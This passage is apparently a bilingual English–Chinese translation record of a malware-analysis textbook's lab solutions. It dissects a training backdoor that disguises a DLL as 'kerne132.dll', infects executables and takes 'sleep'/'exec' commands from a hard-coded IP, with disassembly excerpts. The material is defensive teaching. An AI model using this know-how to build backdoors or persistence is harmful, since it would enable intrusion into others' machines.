  type: TYPE_NORMAL
  zh: 程序硬编码使用文件名 *kerne**1**32.dll*，这使其成为一个好的签名。（注意使用数字 *1* 而不是字母 *l*。）程序使用一个硬编码的互斥锁名为
    SADFHUHF。
- en: 3\.
  id: totrans-1783
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: 'The purpose of this program is to create a difficult-to-remove backdoor that
    connects to a remote host. The backdoor has two commands: one to execute a command
    and one to sleep.'
  id: totrans-1784
  prefs: []
  type: TYPE_NORMAL
  zh: 该程序的目的是为了创建一个难以删除的后门，该后门连接到远程主机。后门有两个命令：一个用于执行命令，另一个用于休眠。
- en: 4\.
  id: totrans-1785
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: This program is very hard to remove because it infects every *.exe* file on
    the system. It’s probably best in this case to restore from backups.
  id: totrans-1786
  prefs: []
  type: TYPE_NORMAL
  zh: 由于该程序感染了系统上的每个 *.exe* 文件，因此很难删除。在这种情况下，最好从备份中恢复。
- en: If restoring from backups is particularly difficult, you could leave the malicious
    *kerne**1**32.dll* file and modify it to remove the malicious content.
  id: totrans-1787
  prefs: []
  type: TYPE_NORMAL
  zh: 如果从备份中恢复特别困难，你可以留下恶意的 *kerne**1**32.dll* 文件并修改它以删除恶意内容。
- en: Alternatively, you could copy *kernel32.dll* and name it *kerne**1**32.dll*,
    or write a program to undo all changes to the PE files.
  id: totrans-1788
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，你可以复制 *kernel32.dll* 并将其命名为 *kerne**1**32.dll*，或者编写一个程序来撤销对PE文件的所有更改。
- en: Solutions to Labs
  id: totrans-1789
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**519**'
  id: totrans-1790
  prefs: []
  type: TYPE_NORMAL
  zh: '**519**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1791
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Detailed Analysis***'
  id: totrans-1792
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: First, we’ll look at *Lab07-03.exe* using basic static analysis techniques.
    When we run Strings on the executable, we get the usual invalid strings and the
    imported functions. We also get days of the week, months of the year, and other
    strings that are part of the library code, not part of the malicious executable.
  id: totrans-1793
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们将使用基本的静态分析技术查看 *Lab07-03.exe*。当我们对可执行文件运行Strings时，我们得到通常的无效字符串和导入的函数。我们还得到星期几、一年中的月份和其他字符串，这些都是库代码的一部分，而不是恶意可执行文件的一部分。
- en: The following listing shows that the code has several interesting strings.
  id: totrans-1794
  prefs: []
  type: TYPE_NORMAL
  zh: 以下列表显示代码中有几个有趣的字符串。
- en: kerne132.dll
  id: totrans-1795
  prefs: []
  type: TYPE_NORMAL
  zh: kerne132.dll
- en: .exe
  id: totrans-1796
  prefs: []
  type: TYPE_NORMAL
  zh: .exe
- en: WARNING_THIS_WILL_DESTROY_YOUR_MACHINE
  id: totrans-1797
  prefs: []
  type: TYPE_NORMAL
  zh: WARNING_THIS_WILL_DESTROY_YOUR_MACHINE
- en: C:\Windows\System32\Kernel32.dll
  id: totrans-1798
  prefs: []
  type: TYPE_NORMAL
  zh: C:\Windows\System32\Kernel32.dll
- en: Lab07-03.dll
  id: totrans-1799
  prefs: []
  type: TYPE_NORMAL
  zh: Lab07-03.dll
- en: Kernel32\.
  id: totrans-1800
  prefs: []
  type: TYPE_NORMAL
  zh: Kernel32\.
- en: C:\windows\system32\kerne132.dll
  id: totrans-1801
  prefs: []
  type: TYPE_NORMAL
  zh: C:\windows\system32\kerne132.dll
- en: C:\*
  id: totrans-1802
  prefs: []
  type: TYPE_NORMAL
  zh: C:\*
- en: The string *kerne**1**32.dll* is clearly designed to look like *kernel32.dll*
    but replaces the *l* with a *1*.
  id: totrans-1803
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串 *kerne**1**32.dll* 明显是为了看起来像 *kernel32.dll*，但将 *l* 替换为 *1*。
- en: '**NOTE**'
  id: totrans-1804
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*For the remainder of this section, the imposter* **kerne132.dll** *will be
    in bold to make it* *easier to differentiate from* kernel32.dll *.*'
  id: totrans-1805
  prefs: []
  type: TYPE_NORMAL
  zh: '*在本节余下的部分，冒名顶替者* **kerne132.dll** *将被加粗，以便更容易与* kernel32.dll *区分。*'
- en: The string Lab07-03.dll tells us that the *.exe* may access the DLL for this
    lab in some way. The string WARNING_THIS_WILL_DESTROY_YOUR_MACHINE is interesting,
    but it’s actually an artifact of the modifications made to this malware for this
    book. Normal malware would not contain this string, and we’ll see more about its
    usage in the malware later.
  id: totrans-1806
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串 Lab07-03.dll 告诉我们，该 *.exe* 可能以某种方式访问该实验的DLL。字符串 WARNING_THIS_WILL_DESTROY_YOUR_MACHINE
    很有趣，但实际上是针对本书对该恶意软件进行的修改的遗留物。正常的恶意软件不会包含此字符串，我们将在稍后看到其在恶意软件中的更多用法。
- en: 'Next, we examine the imports for *Lab07-03.exe*. The most interesting of these
    are as follows:'
  id: totrans-1807
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们检查 *Lab07-03.exe* 的导入项。其中最有趣的是以下内容：
- en: CreateFileA
  id: totrans-1808
  prefs: []
  type: TYPE_NORMAL
  zh: CreateFileA
- en: CreateFileMappingA
  id: totrans-1809
  prefs: []
  type: TYPE_NORMAL
  zh: CreateFileMappingA
- en: MapViewOfFile
  id: totrans-1810
  prefs: []
  type: TYPE_NORMAL
  zh: MapViewOfFile
- en: IsBadReadPtr
  id: totrans-1811
  prefs: []
  type: TYPE_NORMAL
  zh: IsBadReadPtr
- en: UnmapViewOfFile
  id: totrans-1812
  prefs: []
  type: TYPE_NORMAL
  zh: UnmapViewOfFile
- en: CloseHandle
  id: totrans-1813
  prefs: []
  type: TYPE_NORMAL
  zh: CloseHandle
- en: FindFirstFileA
  id: totrans-1814
  prefs: []
  type: TYPE_NORMAL
  zh: FindFirstFileA
- en: FindClose
  id: totrans-1815
  prefs: []
  type: TYPE_NORMAL
  zh: FindClose
- en: FindNextFileA
  id: totrans-1816
  prefs: []
  type: TYPE_NORMAL
  zh: FindNextFileA
- en: CopyFileA
  id: totrans-1817
  prefs: []
  type: TYPE_NORMAL
  zh: CopyFileA
- en: The imports CreateFileA, CreateFileMappingA, and MapViewOfFile tell us that
    this program probably opens a file and maps it into memory. The FindFirstFileA
    and FindNextFileA combination tells us that the program probably searches directories
    and uses CopyFileA to copy files that it finds.
  id: totrans-1818
  prefs: []
  type: TYPE_NORMAL
  zh: 导入项CreateFileA、CreateFileMappingA和MapViewOfFile告诉我们，这个程序可能打开一个文件并将其映射到内存中。FindFirstFileA和FindNextFileA的组合告诉我们，程序可能搜索目录并使用CopyFileA来复制它找到的文件。
- en: The fact that the program does not import *Lab07-03.dll* (or use any of the
    functions from the DLL), LoadLibrary, or GetProcAddress suggests that it probably
    doesn’t load that DLL at runtime. This behavior is suspect and something we need
    to examine as part of our analysis.
  id: totrans-1819
  prefs: []
  type: TYPE_NORMAL
  zh: 事实上，该程序没有导入 *Lab07-03.dll*（或使用该DLL中的任何函数）、LoadLibrary或GetProcAddress，这表明它可能在运行时没有加载该DLL。这种行为令人怀疑，我们需要将其作为分析的一部分进行检查。
- en: '**520**'
  id: totrans-1820
  prefs: []
  type: TYPE_NORMAL
  zh: '**520**'
- en: Appendix C
  id: totrans-1821
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1822
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'Next, we check the DLL for any interesting strings and imports and find a few
    strings worth investigating, as follows:'
  id: totrans-1823
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们检查DLL中是否有任何有趣的字符串和导入项，并发现了一些值得调查的字符串，如下所示：
- en: hello
  id: totrans-1824
  prefs: []
  type: TYPE_NORMAL
  zh: hello
- en: 127.26.152.13
  id: totrans-1825
  prefs: []
  type: TYPE_NORMAL
  zh: 127.26.152.13
- en: sleep
  id: totrans-1826
  prefs: []
  type: TYPE_NORMAL
  zh: sleep
- en: exec
  id: totrans-1827
  prefs: []
  type: TYPE_NORMAL
  zh: exec
- en: The most interesting string is an IP address, 127.26.152.13, that the malware
    might connect to. (You can set up your network-based sensors to look for activity
    to this address.) We also see the strings hello, sleep, and exec, which we should
    examine when we open the program in IDA Pro.
  id: totrans-1828
  prefs: []
  type: TYPE_NORMAL
  zh: 最有趣的字符串是一个 IP 地址，127.26.152.13，恶意软件可能会连接到。（你可以设置基于网络的传感器来查找此地址的活动。）我们还看到了字符串
    hello、sleep 和 exec，当我们在 IDA Pro 中打开程序时，我们应该检查这些字符串。
- en: Next, we check the imports for *Lab07-03.dll*. We see that the imports **7**
  id: totrans-1829
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们检查 *Lab07-03.dll* 的导入。我们看到来自 *ws2_32.dll* 的导入 **7**
- en: from *ws2_32.dll* contain all the functions necessary to send and receive data
    over a network. Also of note is the CreateProcess function, which tells us that
    this program may create another process.
  id: totrans-1830
  prefs: []
  type: TYPE_NORMAL
  zh: 包含所有通过网络发送和接收数据的函数。值得注意的是 CreateProcess 函数，它告诉我们这个程序可能会创建另一个进程。
- en: We also check the exports for *Lab07-03.dll* and see, oddly, that it has none.
    Without any exports, it can’t be imported by another program, though a program
    could still call LoadLibrary on a DLL with no exports. We’ll keep this in mind
    when we look more closely at the DLL.
  id: totrans-1831
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还检查了 *Lab07-03.dll* 的导出，奇怪的是，它没有任何导出。没有导出，它不能被其他程序导入，尽管程序仍然可以调用 LoadLibrary
    在没有导出的 DLL 上。当我们更仔细地查看 DLL 时，我们会记住这一点。
- en: We next try basic dynamic analysis. When we run the executable, it exits quickly
    without much noticeable activity. (We could try to run the DLL using rundll32,
    but because the DLL has no exports, that won’t work.) Unfortunately, basic dynamic
    analysis doesn’t tell us much.
  id: totrans-1832
  prefs: []
  type: TYPE_NORMAL
  zh: 我们接下来尝试基本的动态分析。当我们运行可执行文件时，它快速退出，没有太多明显的活动。（我们可以尝试使用 rundll32 运行 DLL，但由于 DLL
    没有导出，这不会起作用。）不幸的是，基本的动态分析并没有告诉我们太多。
- en: The next step is to perform analysis using IDA Pro. Whether you start with the
    DLL or EXE is a matter of preference. We’ll start with the DLL
  id: totrans-1833
  prefs: []
  type: TYPE_NORMAL
  zh: 下一步是使用 IDA Pro 进行分析。你从 DLL 还是 EXE 开始是一个个人喜好问题。我们将从 DLL 开始
- en: because it’s simpler than the EXE.
  id: totrans-1834
  prefs: []
  type: TYPE_NORMAL
  zh: 因为它比 EXE 更简单。
- en: '**Analyzing the DLL**'
  id: totrans-1835
  prefs: []
  type: TYPE_NORMAL
  zh: '**分析 DLL**'
- en: When looking at the DLL in IDA Pro, we see no exports, but we do see an entry
    point. We should navigate to DLLMain, which is automatically labeled by IDA Pro.
    Unlike the prior two labs, the DLL has a lot of code, and it would take a really
    long time to go through each instruction. Instead, we use a simple trick and look
    only at call instructions, ignoring all other instructions.
  id: totrans-1836
  prefs: []
  type: TYPE_NORMAL
  zh: 当在 IDA Pro 中查看 DLL 时，我们看到没有导出，但我们确实看到了一个入口点。我们应该导航到 DLLMain，这是由 IDA Pro 自动标记的。与先前的两个实验不同，DLL
    有很多代码，逐条指令检查需要花费很长时间。因此，我们使用一个简单的技巧，只查看调用指令，忽略所有其他指令。
- en: This can help you get a quick view of the DLL’s functionality. Let’s see what
    the code would look like with only the relevant call instructions.
  id: totrans-1837
  prefs: []
  type: TYPE_NORMAL
  zh: 这可以帮助你快速了解 DLL 的功能。让我们看看只有相关调用指令的代码会是什么样子。
- en: 10001015 call __alloca_probe
  id: totrans-1838
  prefs: []
  type: TYPE_NORMAL
  zh: 10001015 调用 __alloca_probe
- en: 10001059 call ds:OpenMutexA
  id: totrans-1839
  prefs: []
  type: TYPE_NORMAL
  zh: 10001059 调用 ds:OpenMutexA
- en: 1000106E call ds:CreateMutexA
  id: totrans-1840
  prefs: []
  type: TYPE_NORMAL
  zh: 1000106E 调用 ds:CreateMutexA
- en: 1000107E call ds:WSAStartup
  id: totrans-1841
  prefs: []
  type: TYPE_NORMAL
  zh: 1000107E 调用 ds:WSAStartup
- en: 10001092 call ds:socket
  id: totrans-1842
  prefs: []
  type: TYPE_NORMAL
  zh: 10001092 调用 ds:socket
- en: 100010AF call ds:inet_addr
  id: totrans-1843
  prefs: []
  type: TYPE_NORMAL
  zh: 100010AF 调用 ds:inet_addr
- en: 100010BB call ds:htons
  id: totrans-1844
  prefs: []
  type: TYPE_NORMAL
  zh: 100010BB 调用 ds:htons
- en: 100010CE call ds:connect
  id: totrans-1845
  prefs: []
  type: TYPE_NORMAL
  zh: 100010CE 调用 ds:connect
- en: 10001101 call ds:send
  id: totrans-1846
  prefs: []
  type: TYPE_NORMAL
  zh: 10001101 调用 ds:send
- en: 10001113 call ds:shutdown
  id: totrans-1847
  prefs: []
  type: TYPE_NORMAL
  zh: 10001113 调用 ds:shutdown
- en: 10001132 call ds:recv
  id: totrans-1848
  prefs: []
  type: TYPE_NORMAL
  zh: 10001132 调用 ds:recv
- en: 1000114B call ebp ; strncmp
  id: totrans-1849
  prefs: []
  type: TYPE_NORMAL
  zh: 1000114B 调用 ebp ; strncmp
- en: Solutions to Labs
  id: totrans-1850
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**521**'
  id: totrans-1851
  prefs: []
  type: TYPE_NORMAL
  zh: '**521**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1852
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 10001159 call ds:Sleep
  id: totrans-1853
  prefs: []
  type: TYPE_NORMAL
  zh: 10001159 调用 ds:Sleep
- en: 10001170 call ebp ; strncmp
  id: totrans-1854
  prefs: []
  type: TYPE_NORMAL
  zh: 10001170 调用 ebp ; strncmp
- en: 100011AF call ebx ; CreateProcessA
  id: totrans-1855
  prefs: []
  type: TYPE_NORMAL
  zh: 100011AF 调用 ebx ; CreateProcessA
- en: 100011C5 call ds:Sleep
  id: totrans-1856
  prefs: []
  type: TYPE_NORMAL
  zh: 100011C5 调用 ds:Sleep
- en: The first call is to the library function __alloca_probe to allocate stack on
    the space. All we can tell here is that this function uses a large stack. Following
    this are calls to OpenMutexA and CreateMutexA, which, like the malware in Lab
    7-1, are here to ensure that only one copy of the malware is running at one time.
  id: totrans-1857
  prefs: []
  type: TYPE_NORMAL
  zh: 第一个调用是库函数 __alloca_probe，用于在栈空间上分配空间。我们在这里能告诉你的只是这个函数使用了大量的栈空间。随后是调用 OpenMutexA
    和 CreateMutexA，就像 Lab 7-1 中的恶意软件一样，这是为了确保一次只有一个恶意软件副本在运行。
- en: The other listed functions are needed to establish a connection with a remote
    socket, and to transmit and receive data. This function ends with calls to Sleep
    and CreateProcessA. At this point, we don’t know what data is sent or received,
    or which process is being created, but we can guess at what this DLL does. The
    best explanation for a function that sends and receives data and creates processes
    is that it is designed to receive commands from a remote machine.
  id: totrans-1858
  prefs: []
  type: TYPE_NORMAL
  zh: 列出的其他函数需要与远程套接字建立连接，以及发送和接收数据。此函数以调用Sleep和CreateProcessA结束。到目前为止，我们还不知道发送或接收了什么数据，或者创建了哪个进程，但我们可以猜测这个DLL的作用。一个发送和接收数据并创建进程的函数的最佳解释是它被设计用来接收来自远程机器的命令。
- en: Now that we know what this function is doing, we need to see what data is being
    sent and received. First, we check the destination address of the connection.
    A few lines before the connect call, we see a call to inet_addr with the fixed
    IP address of 127.26.152.13\. We also see that the port argument is 0x50, which
    is port 80, the port normally used for web traffic.
  id: totrans-1859
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道了这个函数的作用，我们需要查看发送和接收的数据。首先，我们检查连接的目地地址。在connect调用之前几行，我们看到一个调用inet_addr，带有固定的IP地址127.26.152.13。我们还看到端口号是0x50，即端口号80，这是通常用于Web流量的端口。
- en: But what data is being communicated? The call to send is shown in the following
    listing.
  id: totrans-1860
  prefs: []
  type: TYPE_NORMAL
  zh: 但正在通信的数据是什么？send的调用如下所示。
- en: 100010F3 push 0 ; flags
  id: totrans-1861
  prefs: []
  type: TYPE_NORMAL
  zh: 100010F3 将0推送到栈上；flags
- en: 100010F5 repne scasb
  id: totrans-1862
  prefs: []
  type: TYPE_NORMAL
  zh: 100010F5 重复前缀不匹配的scasb
- en: 100010F7 not ecx
  id: totrans-1863
  prefs: []
  type: TYPE_NORMAL
  zh: 100010F7 对ecx进行按位非操作
- en: 100010F9 dec ecx
  id: totrans-1864
  prefs: []
  type: TYPE_NORMAL
  zh: 100010F9 ecx减1
- en: 100010FA push ecx ; len
  id: totrans-1865
  prefs: []
  type: TYPE_NORMAL
  zh: 100010FA 将ecx推送到栈上；len
- en: 100010FB push offset buf ;
  id: totrans-1866
  prefs: []
  type: TYPE_NORMAL
  zh: 100010FB 将偏移量buf推送到栈上；
- en: '"hello"'
  id: totrans-1867
  prefs: []
  type: TYPE_NORMAL
  zh: '"hello"'
- en: 10001100 push esi ; s
  id: totrans-1868
  prefs: []
  type: TYPE_NORMAL
  zh: 10001100 将esi寄存器的值推送到栈上；s
- en: 10001101 call ds:send
  id: totrans-1869
  prefs: []
  type: TYPE_NORMAL
  zh: 10001101 调用ds:send
- en: As you can see at , the buf argument stores the data to be sent over the network,
    and IDA Pro recognizes that the pointer to buf represents the string
  id: totrans-1870
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你所见，buf参数存储了要发送到网络上的数据，IDA Pro识别出buf的指针代表了一个字符串
- en: '"hello" and labels it as such. This appears to be a greeting that the victim
    machine sends to let the server know that it’s ready for a command.'
  id: totrans-1871
  prefs: []
  type: TYPE_NORMAL
  zh: '"hello"并将其标记为这样的标签。这似乎是受害机器发送的问候，以便让服务器知道它已准备好接收命令。'
- en: 'Next, we can see what data the program is expecting in response, as follows:'
  id: totrans-1872
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们可以看到程序期望的响应数据如下：
- en: 10001124 lea
  id: totrans-1873
  prefs: []
  type: TYPE_NORMAL
  zh: 10001124 lea
- en: eax, [esp+120Ch+buf]
  id: totrans-1874
  prefs: []
  type: TYPE_NORMAL
  zh: eax, [esp+120Ch+buf]
- en: 1000112B push 1000h ; len
  id: totrans-1875
  prefs: []
  type: TYPE_NORMAL
  zh: 1000112B 将1000h推送到栈上；len
- en: 10001130 push eax ; buf
  id: totrans-1876
  prefs: []
  type: TYPE_NORMAL
  zh: 10001130 将eax寄存器的值推送到栈上；buf
- en: 10001131 push esi ; s
  id: totrans-1877
  prefs: []
  type: TYPE_NORMAL
  zh: 10001131 将esi寄存器的值推送到栈上；s
- en: 10001132 call ds:recv
  id: totrans-1878
  prefs: []
  type: TYPE_NORMAL
  zh: 10001132 调用ds:recv
- en: If we go to the call to recv , we see that the buffer on the stack has been
    labeled by IDA Pro at . Notice that the instruction that first accesses buf is
    an lea instruction at . The instruction doesn’t dereference the value stored
    **522**
  id: totrans-1879
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们转到recv的调用，我们会看到栈上的缓冲区已经被IDA Pro标记为。注意，首先访问buf的指令是一个lea指令。指令没有解引用存储的**522**
- en: Appendix C
  id: totrans-1880
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1881
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: at that location, but instead only obtains a pointer to that location. The call
    to recv will store the incoming network traffic on the stack.
  id: totrans-1882
  prefs: []
  type: TYPE_NORMAL
  zh: 在该位置，但它只获取该位置的指针。recv的调用将存储传入的网络流量到栈上。
- en: Now we must determine what the program is doing with the response.
  id: totrans-1883
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们必须确定程序如何处理响应。
- en: We see the buffer value checked a few lines later at , as shown in the following
    listing.
  id: totrans-1884
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在几行之后看到处的缓冲区值被检查，如下所示。
- en: 1000113C lea ecx, [esp+1208h+buf]
  id: totrans-1885
  prefs: []
  type: TYPE_NORMAL
  zh: 1000113C 将寄存器ecx的值设置为[esp+1208h+buf]的值；
- en: 10001143 push 5 ; size_t
  id: totrans-1886
  prefs: []
  type: TYPE_NORMAL
  zh: 10001143 将5推送到栈上；size_t
- en: 10001145 push ecx ; char *
  id: totrans-1887
  prefs: []
  type: TYPE_NORMAL
  zh: 10001145 将ecx推送到栈上；char *
- en: 10001146 push offset aSleep ; "sleep"
  id: totrans-1888
  prefs: []
  type: TYPE_NORMAL
  zh: 10001146 将aSleep的偏移量推送到栈上；"sleep"
- en: 1000114B call ebp ; strncmp
  id: totrans-1889
  prefs: []
  type: TYPE_NORMAL
  zh: 1000114B 调用ebp；strncmp
- en: 1000114D add esp, 0Ch
  id: totrans-1890
  prefs: []
  type: TYPE_NORMAL
  zh: 1000114D 将esp增加0Ch
- en: 10001150 test eax, eax
  id: totrans-1891
  prefs: []
  type: TYPE_NORMAL
  zh: 10001150 测试eax寄存器是否为零；
- en: '**7**'
  id: totrans-1892
  prefs: []
  type: TYPE_NORMAL
  zh: '**7**'
- en: 10001152 jnz short loc_10001161
  id: totrans-1893
  prefs: []
  type: TYPE_NORMAL
  zh: 10001152 如果不为零则跳转到short loc_10001161
- en: 10001154 push 60000h ; dwMilliseconds
  id: totrans-1894
  prefs: []
  type: TYPE_NORMAL
  zh: 10001154 将十六进制的60000h推送到栈上；dwMilliseconds
- en: 10001159 call ds:Sleep
  id: totrans-1895
  prefs: []
  type: TYPE_NORMAL
  zh: 10001159 调用ds:Sleep
- en: The buffer accessed at  is the same as the one from the previous listing, even
    though the offset from ESP is different (esp+1208+buf in one and esp+120C+buf
    in the other). The difference is due to the fact that the size of the stack has
    changed. IDA Pro labels both buf to make it easy to tell that they’re the same
    value.
  id: totrans-1896
  prefs: []
  type: TYPE_NORMAL
  zh: 在处访问的缓冲区与上一个列表中的相同，尽管从ESP的偏移量不同（一个为esp+1208+buf，另一个为esp+120C+buf）。这种差异是由于栈的大小发生了变化。IDA
    Pro将两个buf都标记出来，以便于识别它们是相同的值。
- en: This code calls strncmp at , and it checks to see if the first five characters
    are the string sleep. Then, immediately after the function call, it checks to
    see if the return value is 0 at ; if so, it calls the Sleep function to sleep
    for 60 seconds. This tells us that if the remote server sends the command sleep,
    the program will call the Sleep function.
  id: totrans-1897
  prefs: []
  type: TYPE_NORMAL
  zh: 这段代码在处调用strncmp，并检查前五个字符是否是字符串sleep。然后，在函数调用后立即检查返回值是否为0，如所示；如果是，它将调用Sleep函数暂停60秒。这告诉我们，如果远程服务器发送sleep命令，程序将调用Sleep函数。
- en: 'We see the buffer accessed again a few instructions later, as follows: 10001161
    lea edx, [esp+1208h+buf]'
  id: totrans-1898
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在几条指令后再次看到缓冲区被访问，如下所示：10001161 lea edx, [esp+1208h+buf]
- en: 10001168 push 4 ; size_t
  id: totrans-1899
  prefs: []
  type: TYPE_NORMAL
  zh: 10001168 push 4 ; size_t
- en: 1000116A push edx ; char *
  id: totrans-1900
  prefs: []
  type: TYPE_NORMAL
  zh: 1000116A push edx ; char *
- en: 1000116B push offset aExec ; "exec"
  id: totrans-1901
  prefs: []
  type: TYPE_NORMAL
  zh: 1000116B push offset aExec ; "exec"
- en: 10001170 call ebp ; strncmp
  id: totrans-1902
  prefs: []
  type: TYPE_NORMAL
  zh: 10001170 call ebp ; strncmp
- en: 10001172 add esp, 0Ch
  id: totrans-1903
  prefs: []
  type: TYPE_NORMAL
  zh: 10001172 add esp, 0Ch
- en: 10001175 test eax, eax
  id: totrans-1904
  prefs: []
  type: TYPE_NORMAL
  zh: 10001175 test eax, eax
- en: 10001177 jnz short loc_100011B6
  id: totrans-1905
  prefs: []
  type: TYPE_NORMAL
  zh: 10001177 jnz short loc_100011B6
- en: 10001179 mov ecx, 11h
  id: totrans-1906
  prefs: []
  type: TYPE_NORMAL
  zh: 10001179 mov ecx, 11h
- en: 1000117E lea edi, [esp+1208h+StartupInfo]
  id: totrans-1907
  prefs: []
  type: TYPE_NORMAL
  zh: 1000117E lea edi, [esp+1208h+StartupInfo]
- en: 10001182 rep stosd
  id: totrans-1908
  prefs: []
  type: TYPE_NORMAL
  zh: 10001182 rep stosd
- en: 10001184 lea eax, [esp+1208h+ProcessInformation]
  id: totrans-1909
  prefs: []
  type: TYPE_NORMAL
  zh: 10001184 lea eax, [esp+1208h+ProcessInformation]
- en: 10001188 lea ecx, [esp+1208h+StartupInfo]
  id: totrans-1910
  prefs: []
  type: TYPE_NORMAL
  zh: 10001188 lea ecx, [esp+1208h+StartupInfo]
- en: 1000118C push eax ; lpProcessInformation 1000118D push ecx ; lpStartupInfo
  id: totrans-1911
  prefs: []
  type: TYPE_NORMAL
  zh: 1000118C push eax ; lpProcessInformation 1000118D push ecx ; lpStartupInfo
- en: 1000118E push 0 ; lpCurrentDirectory
  id: totrans-1912
  prefs: []
  type: TYPE_NORMAL
  zh: 1000118E push 0 ; lpCurrentDirectory
- en: 10001190 push 0 ; lpEnvironment
  id: totrans-1913
  prefs: []
  type: TYPE_NORMAL
  zh: 10001190 push 0 ; lpEnvironment
- en: 10001192 push 8000000h ; dwCreationFlags
  id: totrans-1914
  prefs: []
  type: TYPE_NORMAL
  zh: 10001192 push 8000000h ; dwCreationFlags
- en: 10001197 push 1 ; bInheritHandles
  id: totrans-1915
  prefs: []
  type: TYPE_NORMAL
  zh: 10001197 push 1 ; bInheritHandles
- en: 10001199 push 0 ; lpThreadAttributes
  id: totrans-1916
  prefs: []
  type: TYPE_NORMAL
  zh: 10001199 push 0 ; lpThreadAttributes
- en: 1000119B lea edx, [esp+1224h+CommandLine]
  id: totrans-1917
  prefs: []
  type: TYPE_NORMAL
  zh: 1000119B lea edx, [esp+1224h+CommandLine]
- en: 100011A2 push 0 ; lpProcessAttributes 100011A4 push edx ; lpCommandLine
  id: totrans-1918
  prefs: []
  type: TYPE_NORMAL
  zh: 100011A2 push 0 ; lpProcessAttributes 100011A4 push edx ; lpCommandLine
- en: Solutions to Labs
  id: totrans-1919
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**523**'
  id: totrans-1920
  prefs: []
  type: TYPE_NORMAL
  zh: '**523**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1921
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 100011A5 push 0 ; lpApplicationName 100011A7 mov [esp+1230h+StartupInfo.cb],
    44h
  id: totrans-1922
  prefs: []
  type: TYPE_NORMAL
  zh: 100011A5 push 0 ; lpApplicationName 100011A7 mov [esp+1230h+StartupInfo.cb],
    44h
- en: 100011AF call ebx ; CreateProcessA
  id: totrans-1923
  prefs: []
  type: TYPE_NORMAL
  zh: 100011AF call ebx ; CreateProcessA
- en: This time, we see that the code is checking to see if the buffer begins with
    exec. If so, the strncmp function will return 0, as shown at , and the code will
    fall through the jnz instruction at  and call the CreateProcessA function.
  id: totrans-1924
  prefs: []
  type: TYPE_NORMAL
  zh: 这次，我们看到代码正在检查缓冲区是否以exec开头。如果是这样，strncmp函数将返回0，如所示，并且代码将跳过jnz指令并调用CreateProcessA函数。
- en: There are a lot of parameters to the CreateProcessA function shown at , but
    the most interesting is the CommandLine parameter at , which tells us the process
    that will be created. The listing suggests that the string in CommandLine was
    stored on the stack somewhere earlier in code, and we need to determine where.
    We search backward in our code to find CommandLine by placing the cursor on the
    CommandLine operator to highlight all instances within this function where the
    CommandLine value is accessed. Unfortunately, when you look through the whole
    function, you’ll see that the CommandLine pointer does not seem to be accessed
    or set elsewhere in the function.
  id: totrans-1925
  prefs: []
  type: TYPE_NORMAL
  zh: 在处显示的CreateProcessA函数有很多参数，但最有趣的是处的CommandLine参数，它告诉我们将要创建的进程。列表表明，CommandLine中的字符串在代码的早期某个地方存储在栈上，我们需要确定它的位置。我们在代码中向后搜索，通过将光标放在CommandLine操作符上以突出显示此函数中访问CommandLine值的所有实例来找到CommandLine。不幸的是，当你查看整个函数时，你会看到CommandLine指针似乎在函数的其他地方没有被访问或设置。
- en: At this point, we’re stuck. We see that CreateProcessA is called and that the
    program to be run is stored in CommandLine, but we don’t see CommandLine written
    anywhere. CommandLine must be written prior to being used as a parameter to CreateProcessA,
    so we still have some work to do.
  id: totrans-1926
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个点上，我们遇到了难题。我们看到CreateProcessA被调用了，要运行的程序存储在CommandLine中，但我们没有看到CommandLine的任何写入。CommandLine必须在作为CreateProcessA参数使用之前被写入，所以我们还有一些工作要做。
- en: This is a tricky case where IDA Pro’s automatic labeling has actually made it
    more difficult to identify where CommandLine was written. The IDA Pro function
    information shown in the following listing tells us that CommandLine corresponds
    to the value of 0x0FFB at .
  id: totrans-1927
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个棘手的情况，IDA Pro的自动标记实际上使得识别CommandLine的写入位置变得更加困难。以下列表中显示的IDA Pro函数信息告诉我们CommandLine对应于处的0x0FFB值。
- en: 10001010 ; BOOL __stdcall DllMain(...)
  id: totrans-1928
  prefs: []
  type: TYPE_NORMAL
  zh: 10001010 ; BOOL __stdcall DllMain(...)
- en: 10001010 _DllMain@12 proc near
